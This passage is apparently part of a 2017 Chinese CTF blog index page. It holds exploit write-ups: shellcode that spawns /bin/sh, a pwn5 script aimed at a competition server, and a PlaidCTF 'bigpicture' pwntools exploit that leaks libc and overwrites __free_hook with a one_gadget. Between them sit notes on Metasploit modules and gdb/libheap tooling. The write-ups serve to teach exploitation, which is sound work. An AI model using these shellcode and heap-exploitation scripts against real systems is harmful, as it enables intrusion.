class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span><span class="comment">#shellcode</span></div><div class="line">r.send(payload)</div><div class="line"><span class="attr">payload</span> = p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line">payload += p64(<span class="number">0</span>x4000B3)<span class="comment">#fill</span></div><div class="line"><span class="attr">payload</span> = payload[:<span class="number">15</span>]</div><div class="line">r.send(payload)<span class="comment">#set rax=sys_rt_sigreturn</span></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
+<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>老套路了。。将环境变量中文件名的指针覆盖为flag的地址，<code>__stack_chk_fail</code>时候输出即可。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line"><span class="built_in">local</span> = <span class="number">0</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./pwnsss'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote(<span class="string">'106.75.93.221'</span>, <span class="number">10003</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">def pwn():</div><div class="line">    p.recvuntil(<span class="string">'something\n'</span>)</div><div class="line">    payload = p32(<span class="number">0x0804a080</span>) * <span class="number">300</span></div><div class="line">    p.sendline(payload)</div><div class="line">    print p.recvline()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div></pre></td></tr></table></figure>
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/09/2017广东红帽pwn/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-Metasploit-learning" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/05/09/Metasploit-learning/">Metasploit learning</a>
+    </h1>
+  
+
+        
+        <a href="/2017/05/09/Metasploit-learning/" class="archive-article-date">
+  	<time datetime="2017-05-09T04:14:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-05-09</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="体系框架"><a href="#体系框架" class="headerlink" title="体系框架"></a>体系框架</h2><p><img src="/2017/05/09/Metasploit-learning/m.png" alt="框架"></p>
+<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>Metasploit框架的核心，通过多个模块的组装，完成渗透攻击中各个阶段的不同功能。</p>
+<h3 id="辅助模块-AUX"><a href="#辅助模块-AUX" class="headerlink" title="辅助模块 AUX"></a>辅助模块 AUX</h3><p>主要是渗透测试的信息收集环节，进而帮助攻击者完成更精确的攻击。<br>同时还包含一些无需加载攻击载荷，但往往不是为了取得目标系统的权限，比如拒绝服务攻击。</p>
+<h3 id="渗透攻击模块-Exploit"><a href="#渗透攻击模块-Exploit" class="headerlink" title="渗透攻击模块 Exploit"></a>渗透攻击模块 Exploit</h3><p>核心功能，又分为主动攻击模块和被动攻击模块，目的是为了获得目标组件的一定的访问权限。<br>攻击模块又分为多个不同的类别，囊括了主流操作系统和一些分支操作系统。</p>
+<h3 id="攻击载荷模块-Payloads"><a href="#攻击载荷模块-Payloads" class="headerlink" title="攻击载荷模块 Payloads"></a>攻击载荷模块 Payloads</h3><p>具体的完成指定任务的代码，包括<strong>独立</strong>， <strong>传输器</strong>，<strong>传输体</strong>，三种不同的类型。</p>
+<h3 id="空指令模块-Nops"><a href="#空指令模块-Nops" class="headerlink" title="空指令模块 Nops"></a>空指令模块 Nops</h3><p>主要是用来在执行的shellcode前添加添加一大块nop，用来攻击内存随机化，地址偏移等情况。</p>
+<h3 id="编码器模块-Encoders"><a href="#编码器模块-Encoders" class="headerlink" title="编码器模块 Encoders"></a>编码器模块 Encoders</h3><p>通过一定的编码来去掉“坏字符”，和绕过一定的安全防御软件，实现免杀。<br>同时注意可能会出现找不到合适的payload的情况。</p>
+<h3 id="后渗透攻击模块-Post"><a href="#后渗透攻击模块-Post" class="headerlink" title="后渗透攻击模块 Post"></a>后渗透攻击模块 Post</h3><p>主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。<br>Metasploit中的后渗透攻击模块的名字成为Meterpretr。</p>
+<h2 id="基本攻击"><a href="#基本攻击" class="headerlink" title="基本攻击"></a>基本攻击</h2><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><a href="https://www.i0day.com/1182.html" target="_blank" rel="external">metasploit终端命令大全 MSF</a></p>
+<h2 id="一些小坑"><a href="#一些小坑" class="headerlink" title="一些小坑"></a>一些小坑</h2><ol>
+<li><p>msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用<code>msfupdate</code>。如果在kali上用<code>msfupdate</code>可能会遇到未知错误。</p>
+</li>
+<li><p><code>Failed to connect to the database: could not connect to server: Connection refused</code>遇到注重错误一般是<code>postgresql</code>服务没开，按照<a href="https://community.rapid7.com/thread/9302" target="_blank" rel="external">官方回答</a>修改即可。</p>
+</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/05/09/Metasploit-learning/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwn的一些小心得" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/26/pwn的一些小心得/">pwn的一些小心得</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/26/pwn的一些小心得/" class="archive-article-date">
+  	<time datetime="2017-04-26T12:19:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="libheaps与pwndbg兼容"><a href="#libheaps与pwndbg兼容" class="headerlink" title="libheaps与pwndbg兼容"></a>libheaps与pwndbg兼容</h2><p>其实本来也不存在conflict，就是几个命令用了同样的名字，所以我安装libheap的时候就改了几个命令的名字。</p>
+<p>注册command的文件在这个目录下：<br><code>/root/libheap/libheap/frontend/commands/gdb</code></p>
+<p>改几个注册名就好，下面以我把<code>heap</code>改为<code>libheap</code>为例，当然可能改成<code>heap_lib</code>这种更合适。。。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">heap</span><span class="params">(gdb.Command)</span>:</span></div><div class="line">    <span class="string">"""libheap command help listing"""</span></div><div class="line"></div><div class="line"><span class="comment"># 主要就是__init__这里存在注册功能</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, debugger=None, version=None)</span>:</span></div><div class="line">        super(heap, self).__init__(<span class="string">"libheap"</span>, gdb.COMMAND_OBSCURE,</div><div class="line">                                   gdb.COMPLETE_NONE)</div></pre></td></tr></table></figure></p>
+<p>当然，下面的功能名最好也改改。。。<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">def invoke(self, arg, from_tty):</div><div class="line">    # XXX: self.dbg.string_to_argv</div><div class="line">    <span class="keyword">if</span> arg.find(<span class="string">"-h"</span>) != -1:</div><div class="line">        # print_header(<span class="string">"heap "</span>, end=<span class="string">""</span>)</div><div class="line">        # print(<span class="string">"Options:"</span>, end=<span class="string">"\n\n"</span>)</div><div class="line">        # print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"-a 0x1234"</span>))</div><div class="line">        # print(<span class="string">"Specify an arena address"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libheapls"</span>))</div><div class="line">        print(<span class="string">"Print a flat listing of all chunks in an arena"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libfastbins [#]"</span>))</div><div class="line">        print(<span class="string">"Print all fast bins, or only a single fast bin"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libsmallbins [#]"</span>))</div><div class="line">        print(<span class="string">"Print all small bins, or only a single small bin"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libfreebins"</span>))</div><div class="line">        print(<span class="string">"Print compact bin listing (only free chunks)"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libheaplsc"</span>))</div><div class="line">        print(<span class="string">"Print compact arena listing (all chunks)"</span>)</div><div class="line">        print_header(<span class="string">"&#123;:&lt;15&#125;"</span>.format(<span class="string">"libmstats"</span>), end=<span class="string">""</span>)</div><div class="line">        print(<span class="string">"Print memory alloc statistics similar to malloc_stats(3)"</span>)</div><div class="line">        # print_header(<span class="string">"&#123;:&lt;22&#125;"</span>.format(<span class="string">"print_bin_layout [#]"</span>), end=<span class="string">""</span>)</div><div class="line">        # print(<span class="string">"Print the layout of a particular free bin"</span>)</div><div class="line">        <span class="keyword">return</span></div></pre></td></tr></table></figure></p>
+<p>学习了一下gdb的python脚本写法，过两天改改pwndbg，添加点别的功能。。</p>
+<h2 id="新工具"><a href="#新工具" class="headerlink" title="新工具"></a>新工具</h2><p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="external">pwngdb一个专门用来打ctfpwn的gdb增强脚本</a></p>
+<p>用来功能的确好用。</p>
+<h2 id="i386的libc-dbg安装"><a href="#i386的libc-dbg安装" class="headerlink" title="i386的libc-dbg安装"></a>i386的libc-dbg安装</h2><p>在使用heap命令时发现需要装32位的libc-dbg，于是上网查了查方法<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dpkg --<span class="keyword">print</span>-architecture</div><div class="line">apt-<span class="built_in">get</span> <span class="keyword">update</span></div><div class="line">apt-<span class="built_in">get</span> install libc6-db<span class="variable">g:i386</span></div></pre></td></tr></table></figure></p>
+<p><a href="https://askubuntu.com/questions/551840/unable-to-locate-package-libc6-dbgi386-in-docker/552273" target="_blank" rel="external">Unable to locate package libc6-dbg:i386 in docker</a></p>
+<h2 id="gdb一些命令"><a href="#gdb一些命令" class="headerlink" title="gdb一些命令"></a>gdb一些命令</h2><p><code>watch expr</code> 设置写watchpoint，当应用程序写expr, 修改其值时，程序停止运行<br><code>rwatch expr</code>设置读watchpoint，当应用程序读表达式expr时，程序停止运行<br><code>awatch expr</code>设置读写watchpoint, 当应用程序读或者写表达式expr时，程序都会停止运行</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">pwndbg</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">libheap</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/26/pwn的一些小心得/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-2017PlaidCTF-bigpicture" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/26/2017PlaidCTF-bigpicture/">2017PlaidCTF bigpicture</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/26/2017PlaidCTF-bigpicture/" class="archive-article-date">
+  	<time datetime="2017-04-26T10:43:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="bigpicture"><a href="#bigpicture" class="headerlink" title="bigpicture"></a>bigpicture</h2><p>我也就做做这种水题了Orz，唉。。看后面的题目看都看不懂。。。</p>
+<p>给了c文件，良心。。可能觉得其他的pwnable都太变态了吧。。这周还有Defcon的一个外卡赛，继续观摩大佬们秒题。</p>
+<p>明显存在一个数组边界溢出，没有检查负数情况。同时分配的内存大小可控，我们可以分配得到一个mmap映射的内存，这样就相当于绕过了aslr。。</p>
+<p>推荐一个工具<strong><a href="https://github.com/david942j/one_gadget" target="_blank" rel="external">one_gadget</a></strong>，正如作者所说</p>
+<blockquote>
+<p>This gem provides such gadgets finder, no need to use IDA-pro every time like a fool.</p>
+</blockquote>
+<p>嗯，真的每次找one_gadget都想SB一样，最主要的是这个工具直接给出了参数条件，良心。。。</p>
+<p>用到了一个<code>calloc</code>函数，第一次是在0CTF中遇到，和<code>malloc</code>功能相同，但是会把分配得到的内存清<code>0</code>。<br>学到一个快速查看函数的方法，如：<code>man calloc</code><br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">MALLOC(<span class="number">3</span>)                                                                                 Linux Programmer<span class="symbol">'s</span> Manual                                                                                 MALLOC(<span class="number">3</span>)</div><div class="line"></div><div class="line">NAME</div><div class="line">       malloc, free, calloc, realloc - allocate <span class="keyword">and</span> free dynamic memory</div><div class="line"></div><div class="line">SYNOPSIS</div><div class="line">       #include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">       void *malloc(size_t size);</div><div class="line">       void free(void *ptr);</div><div class="line">       void *calloc(size_t nmemb, size_t size);</div><div class="line">       void *realloc(void *ptr, size_t size);</div><div class="line"></div><div class="line">DESCRIPTION</div><div class="line">       The  malloc() <span class="keyword">function</span> allocates size bytes <span class="keyword">and</span> returns a pointer <span class="keyword">to</span> the allocated memory.  The memory <span class="keyword">is</span> <span class="keyword">not</span> initialized.  <span class="keyword">If</span> size <span class="keyword">is</span> <span class="number">0</span>, <span class="keyword">then</span> malloc() returns either <span class="keyword">NULL</span>, <span class="keyword">or</span> a unique pointer value</div><div class="line">       that can later be successfully passed <span class="keyword">to</span> free().</div><div class="line"></div><div class="line">       The free() <span class="keyword">function</span> frees the memory space pointed <span class="keyword">to</span> by ptr, which must have been returned by a previous call <span class="keyword">to</span> malloc(), calloc(), <span class="keyword">or</span> realloc().  Otherwise,  <span class="keyword">or</span>  <span class="keyword">if</span>  free(ptr)  has  already  been</div><div class="line">       called before, undefined behavior occurs.  <span class="keyword">If</span> ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, no operation <span class="keyword">is</span> performed.</div><div class="line"></div><div class="line">       The  calloc() <span class="keyword">function</span> allocates memory <span class="keyword">for</span> an <span class="keyword">array</span> <span class="keyword">of</span> nmemb elements <span class="keyword">of</span> size bytes each <span class="keyword">and</span> returns a pointer <span class="keyword">to</span> the allocated memory.  The memory <span class="keyword">is</span> set <span class="keyword">to</span> zero.  <span class="keyword">If</span> nmemb <span class="keyword">or</span> size <span class="keyword">is</span> <span class="number">0</span>, <span class="keyword">then</span> cal‐</div><div class="line">       loc() returns either <span class="keyword">NULL</span>, <span class="keyword">or</span> a unique pointer value that can later be successfully passed <span class="keyword">to</span> free().</div><div class="line"></div><div class="line">       The realloc() <span class="keyword">function</span> changes the size <span class="keyword">of</span> the memory <span class="keyword">block</span> pointed <span class="keyword">to</span> by ptr <span class="keyword">to</span> size bytes.  The contents will be unchanged <span class="keyword">in</span> the <span class="keyword">range</span> from the start <span class="keyword">of</span> the region up <span class="keyword">to</span> the minimum  <span class="keyword">of</span>  the  old</div><div class="line">       <span class="keyword">and</span>  <span class="keyword">new</span>  sizes.  <span class="keyword">If</span> the <span class="keyword">new</span> size <span class="keyword">is</span> larger than the old size, the added memory will <span class="keyword">not</span> be initialized.  <span class="keyword">If</span> ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, <span class="keyword">then</span> the call <span class="keyword">is</span> equivalent <span class="keyword">to</span> malloc(size), <span class="keyword">for</span> <span class="keyword">all</span> values <span class="keyword">of</span> size; <span class="keyword">if</span> size</div><div class="line">       <span class="keyword">is</span> equal <span class="keyword">to</span> zero, <span class="keyword">and</span> ptr <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">NULL</span>, <span class="keyword">then</span> the call <span class="keyword">is</span> equivalent <span class="keyword">to</span> free(ptr).  Unless ptr <span class="keyword">is</span> <span class="keyword">NULL</span>, it must have been returned by an earlier call <span class="keyword">to</span> malloc(), calloc() <span class="keyword">or</span> realloc().  <span class="keyword">If</span>  the  area</div><div class="line">       pointed <span class="keyword">to</span> was moved, a free(ptr) <span class="keyword">is</span> done.</div><div class="line"></div><div class="line"><span class="keyword">RETURN</span> VALUE</div><div class="line">       The malloc() <span class="keyword">and</span> calloc() functions <span class="keyword">return</span> a pointer <span class="keyword">to</span> the allocated memory, which <span class="keyword">is</span> suitably aligned <span class="keyword">for</span> any built-<span class="keyword">in</span> <span class="keyword">type</span>.  <span class="keyword">On</span> <span class="literal">error</span>, these functions <span class="keyword">return</span> <span class="keyword">NULL</span>.  <span class="keyword">NULL</span> may also be returned by a</div><div class="line">       successful call <span class="keyword">to</span> malloc() <span class="keyword">with</span> a size <span class="keyword">of</span> zero, <span class="keyword">or</span> by a successful call <span class="keyword">to</span> calloc() <span class="keyword">with</span> nmemb <span class="keyword">or</span> size equal <span class="keyword">to</span> zero.</div><div class="line"></div><div class="line">       The free() <span class="keyword">function</span> returns no value.</div><div class="line"></div><div class="line">       The realloc() <span class="keyword">function</span> returns a pointer <span class="keyword">to</span> the newly allocated memory, which <span class="keyword">is</span> suitably aligned <span class="keyword">for</span> any built-<span class="keyword">in</span> <span class="keyword">type</span> <span class="keyword">and</span> may be different from ptr, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">if</span> the  request  fails.   <span class="keyword">If</span>  size  was</div><div class="line">       equal <span class="keyword">to</span> <span class="number">0</span>, either <span class="keyword">NULL</span> <span class="keyword">or</span> a pointer suitable <span class="keyword">to</span> be passed <span class="keyword">to</span> free() <span class="keyword">is</span> returned.  <span class="keyword">If</span> realloc() fails, the original <span class="keyword">block</span> <span class="keyword">is</span> left untouched; it <span class="keyword">is</span> <span class="keyword">not</span> freed <span class="keyword">or</span> moved.</div><div class="line"></div><div class="line">ERRORS</div><div class="line">       calloc(), malloc(), <span class="keyword">and</span> realloc() can fail <span class="keyword">with</span> the following <span class="literal">error</span>:</div><div class="line"></div><div class="line">       ENOMEM <span class="keyword">Out</span> <span class="keyword">of</span> memory.  Possibly, the application hit the RLIMIT_AS <span class="keyword">or</span> RLIMIT_DATA limit described <span class="keyword">in</span> getrlimit(<span class="number">2</span>).</div><div class="line"></div><div class="line">ATTRIBUTES</div><div class="line">       <span class="keyword">For</span> an explanation <span class="keyword">of</span> the terms used <span class="keyword">in</span> this section, see attributes(<span class="number">7</span>).</div><div class="line"></div><div class="line">       ┌─────────────────────┬───────────────┬─────────┐</div><div class="line">       │Interface            │ <span class="keyword">Attribute</span>     │ Value   │</div><div class="line">       ├─────────────────────┼───────────────┼─────────┤</div><div class="line">       │malloc(), free(),    │ Thread safety │ MT-Safe │</div><div class="line">       │calloc(), realloc()  │               │         │</div><div class="line">       └─────────────────────┴───────────────┴─────────┘</div><div class="line">...</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>思路：</p>
+<ol>
+<li>利用任意地址读泄露libc基址</li>
+<li>将<code>__free_hook</code>修改为<code>one_gadget</code></li>
+</ol>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">slog = <span class="number">0</span></div><div class="line">local = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> local:</div><div class="line">    p = process(<span class="string">'./bigpicture'</span>)</div><div class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> local <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, open(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line">offset = <span class="number">0x109000</span> + <span class="number">16</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(address, data)</span>:</span></div><div class="line">    t = <span class="number">0</span></div><div class="line">    address -= <span class="number">0x398000</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(offset - (address - libc.address), offset - (address - libc.address) - <span class="number">8</span>, <span class="number">-1</span>):</div><div class="line">        k = -i</div><div class="line">        p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">        p.sendline(<span class="string">'0, &#123;&#125;, &#123;&#125;'</span>.format(k, data[t]))</div><div class="line">        t += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'big?'</span>)</div><div class="line">    p.sendline(<span class="string">'1000 x 1000'</span>)</div><div class="line">    leak_realloc = <span class="string">''</span>       <span class="comment"># _dl_runtime_resolve_avx_slow</span></div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x109000</span> - <span class="number">24</span>, <span class="number">0x109000</span> - <span class="number">30</span>, <span class="number">-1</span>):</div><div class="line">        k = -i</div><div class="line">        p.recvuntil(<span class="string">'&gt;'</span>)</div><div class="line">        p.sendline(<span class="string">'0, &#123;&#125;, r'</span>.format(k))</div><div class="line">        p.recvuntil(<span class="string">'overwriting '</span>)</div><div class="line">        leak_realloc = p.recv(<span class="number">1</span>) + leak_realloc</div><div class="line">    <span class="keyword">print</span> leak_realloc.encode(<span class="string">'hex'</span>)</div><div class="line">    leak_realloc = int(leak_realloc.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</div><div class="line">    libc.address = leak_realloc - libc.plt[<span class="string">'realloc'</span>] - <span class="number">6</span> - <span class="number">0x10</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'libc.address =&gt; '</span>, hex(libc.address)</div><div class="line">    __free_hook_addr = libc.symbols[<span class="string">'__free_hook'</span>]</div><div class="line">    <span class="keyword">print</span> <span class="string">'__free_hook =&gt; '</span>, hex(libc.symbols[<span class="string">'__free_hook'</span>])</div><div class="line">    one_gadget = libc.address + <span class="number">0x3f33a</span></div><div class="line">    <span class="keyword">print</span> <span class="string">'one_gadget =&gt; '</span>, hex(one_gadget)</div><div class="line">    edit(__free_hook_addr, p64(one_gadget))</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line">    p.sendline(<span class="string">'quit'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PWN</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/04/26/2017PlaidCTF-bigpicture/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
+    <article id="post-pwn中的栈迁移" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/04/26/pwn中的栈迁移/">pwn中的栈迁移</a>
+    </h1>
+  
+
+        
+        <a href="/2017/04/26/pwn中的栈迁移/" class="archive-article-date">
+  	<time datetime="2017-04-26T08:38:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-04-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>连着好几次遇到栈迁移问题了，总结记录下。<br>每一种的类型都不一样，不过目的都是一样的，就是将esp或ebp变为我们可控的数据，大概可以分为三类：</p>
+<ol>
+<li>stack pivot后mprotect</li>
+<li>ebp的partial overwrite</li>
+<li>栈迁移的gadget</li>
+</ol>
